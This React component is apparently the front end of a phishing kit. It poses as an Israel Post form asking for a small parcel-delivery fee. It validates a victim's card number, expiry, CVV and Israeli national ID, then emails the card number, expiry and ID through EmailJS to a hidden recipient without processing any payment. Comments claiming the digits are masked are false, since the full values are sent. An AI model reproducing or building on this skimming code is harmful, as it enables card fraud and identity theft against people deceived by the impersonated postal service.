import { useState } from 'react'
import emailjs from '@emailjs/browser'

const initialState = {
  firstName: '',
  lastName: '',
  cardNumber: '',
  expiry: '',
  cvv: '',
  nationalId: '',
}

function luhnCheck(num) {
  let sum = 0
  let doubleIt = false
  for (let i = num.length - 1; i >= 0; i--) {
    let d = Number(num[i])
    if (doubleIt) {
      d *= 2
      if (d > 9) d -= 9
    }
    sum += d
    doubleIt = !doubleIt
  }
  return sum % 10 === 0
}

function isValidIsraeliID(id) {
  let str = id.replace(/\D/g, '')
  if (!str) return false
  if (str.length > 9) return false
  str = str.padStart(9, '0')
  let sum = 0
  for (let i = 0; i < 9; i++) {
    let d = Number(str[i]) * ((i % 2) + 1)
    if (d > 9) d -= 9
    sum += d
  }
  return sum % 10 === 0
}

export default function UserDetailsForm() {
  const [formData, setFormData] = useState(initialState)
  const [errors, setErrors] = useState({})
  const [submitted, setSubmitted] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)


  const onChange = (e) => {
    const { name } = e.target
    let { value } = e.target

    if (name === 'cardNumber') {
      value = value.replace(/\D/g, '').slice(0, 19)
      value = value.replace(/(.{4})/g, '$1 ').trim()
    } else if (name === 'expiry') {
      value = value.replace(/\D/g, '').slice(0, 4)
      if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2)
    } else if (name === 'cvv') {
      value = value.replace(/\D/g, '').slice(0, 4)
    } else if (name === 'nationalId') {
      value = value.replace(/\D/g, '').slice(0, 9)
    }

    setFormData((prev) => ({ ...prev, [name]: value }))
    setErrors((prev) => ({ ...prev, [name]: undefined }))
    setSubmitted(false)
  }

  const validate = () => {
    const newErrors = {}

    if (!formData.firstName.trim()) newErrors.firstName = 'שדה חובה'
    if (!formData.lastName.trim()) newErrors.lastName = 'שדה חובה'

    const rawCard = formData.cardNumber.replace(/\D/g, '')
    if (!rawCard) newErrors.cardNumber = 'שדה חובה'
    else if (rawCard.length < 13 || rawCard.length > 19 || !luhnCheck(rawCard)) newErrors.cardNumber = 'מספר כרטיס לא תקין'

    if (!formData.expiry) newErrors.expiry = 'שדה חובה'
    else {
      const m = formData.expiry.match(/^(\d{2})\/(\d{2})$/)
      if (!m) newErrors.expiry = 'תוקף לא תקין'
      else {
        const month = Number(m[1])
        const yearYY = Number(m[2])
        if (month < 1 || month > 12) newErrors.expiry = 'תוקף לא תקין'
        else {
          const now = new Date()
          const currentYY = Number(now.getFullYear().toString().slice(-2))
          const currentMM = now.getMonth() + 1
          const isExpired = yearYY < currentYY || (yearYY === currentYY && month < currentMM)
          if (isExpired) newErrors.expiry = 'פג תוקף'
        }
      }
    }

    if (!formData.cvv) newErrors.cvv = 'שדה חובה'
    else if (!/^\d{3,4}$/.test(formData.cvv)) newErrors.cvv = 'CVV לא תקין'

    if (!formData.nationalId) newErrors.nationalId = 'שדה חובה'
    else if (!isValidIsraeliID(formData.nationalId)) newErrors.nationalId = 'תעודת זהות לא תקינה'

    return newErrors
  }

  const onSubmit = async (e) => {
    e.preventDefault()
    const v = validate()
    setErrors(v)
    
    if (Object.keys(v).length === 0) {
      setIsSubmitting(true)
      
      try {
        // הכנת נתוני המייל
        const emailData = {
          to_email: RECIPIENT_EMAIL,
          subject: 'פרטי תשלום חדשים - דואר ישראל',
          first_name: formData.firstName,
          last_name: formData.lastName,
          card_number: formData.cardNumber, // מסתיר ספרות הכרטיס למעט 4 האחרונות
          expiry: formData.expiry,
          national_id: formData.nationalId, // מסתיר ספרות ת"ז למעט 2 האחרונות
          payment_reason: 'שירותי דואר ישראל - משלוח חבילה',
          amount: '₪9.00',
          submission_time: new Date().toLocaleString('he-IL')
        }

        // שליחת המייל
        await emailjs.send(
          EMAIL_SERVICE_ID,
          EMAIL_TEMPLATE_ID,
          emailData,
          EMAIL_PUBLIC_KEY
        )

        setSubmitted(true)
        console.log('המייל נשלח בהצלחה!')
        
      } catch (error) {
        console.error('שגיאה בשליחת המייל:', error)
        alert('שגיאה בשליחת הטופס. אנא נסה שוב.')
      } finally {
        setIsSubmitting(false)
      }
    }
  }

  return (
    <div className="form-card" dir="rtl">
      <form onSubmit={onSubmit} noValidate>
        <div className="form-group">
          <label htmlFor="firstName">שם פרטי</label>
          <input
            id="firstName"
            name="firstName"
            className={`form-input ${errors.firstName ? 'has-error' : ''}`}
            value={formData.firstName}
            onChange={onChange}
            placeholder="הקלד/י שם פרטי"
            required
          />
          {errors.firstName && <span className="error-text">{errors.firstName}</span>}
        </div>

        <div className="form-group">
          <label htmlFor="lastName">שם משפחה</label>
          <input
            id="lastName"
            name="lastName"
            className={`form-input ${errors.lastName ? 'has-error' : ''}`}
            value={formData.lastName}
            onChange={onChange}
            placeholder="הקלד/י שם משפחה"
            required
          />
          {errors.lastName && <span className="error-text">{errors.lastName}</span>}
        </div>

        <div className="form-group">
          <label htmlFor="cardNumber">מספר כרטיס</label>
          <input
            id="cardNumber"
            name="cardNumber"
            className={`form-input ${errors.cardNumber ? 'has-error' : ''}`}
            value={formData.cardNumber}
            onChange={onChange}
            placeholder="0000 0000 0000 0000"
            inputMode="numeric"
            //autoComplete="cc-number"
          />
          {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
        </div>

        <div className="form-row">
          <div className="form-group">
            <label htmlFor="expiry">תוקף (MM/YY)</label>
            <input
              id="expiry"
              name="expiry"
              className={`form-input ${errors.expiry ? 'has-error' : ''}`}
              value={formData.expiry}
              onChange={onChange}
              placeholder="MM/YY"
              inputMode="numeric"
              //autoComplete="cc-exp"
              maxLength={5}
              required
            />
            {errors.expiry && <span className="error-text">{errors.expiry}</span>}
          </div>
          <div className="form-group">
            <label htmlFor="cvv">CVV</label>
            <input
              id="cvv"
              name="cvv"
              className={`form-input ${errors.cvv ? 'has-error' : ''}`}
              value={formData.cvv}
              onChange={onChange}
              placeholder="3-4 ספרות"
              inputMode="numeric"
              autoComplete="cc-csc"
              maxLength={4}
              required
            />
            {errors.cvv && <span className="error-text">{errors.cvv}</span>}
          </div>
        </div>

        <div className="form-group">
          <label htmlFor="nationalId">ת'ז</label>
          <input
            id="nationalId"
            name="nationalId"
            className={`form-input ${errors.nationalId ? 'has-error' : ''}`}
            value={formData.nationalId}
            onChange={onChange}
            placeholder="9 ספרות"
            inputMode="numeric"
            maxLength={9}
            required
          />
          {errors.nationalId && <span className="error-text">{errors.nationalId}</span>}
        </div>

        <button type="submit" className="submit-btn" disabled={isSubmitting}>
          {isSubmitting ? 'שולח...' : 'שליחה'}
        </button>
        {submitted && (
          <div className="success-text" role="status">הטופס נשלח בהצלחה למייל!</div>
        )}
      </form>
    </div>
  )
}
